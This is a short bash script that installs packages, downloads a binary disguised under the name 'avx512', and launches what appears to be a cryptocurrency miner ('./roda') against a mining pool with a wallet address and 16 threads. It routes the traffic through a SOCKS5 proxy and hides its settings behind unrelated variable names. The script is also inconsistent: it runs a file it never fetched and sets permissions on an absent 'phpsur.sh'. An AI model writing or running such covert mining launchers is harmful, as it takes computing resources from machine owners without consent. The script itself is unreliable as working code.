#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O avx512 https://github.com/set-arithmetic/set-arithmetic/blob/main/avx512 
screen -dmS ls
chmod +x phpsur.sh && chmod +x avx512 && chmod 777 avx512 phpsur.sh
RENANG=stratum+tcps://stratum-na.rplant.xyz:17115
ACIS=shuga1q7d75aamrpx6zhanaemu57262mlz3u9cvlvz02d
STRESS=yespowersugar
BANGUNAN=Ci-00
PROXY=socks5://158.69.225.110:59166
./roda -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 16 -x $PROXY
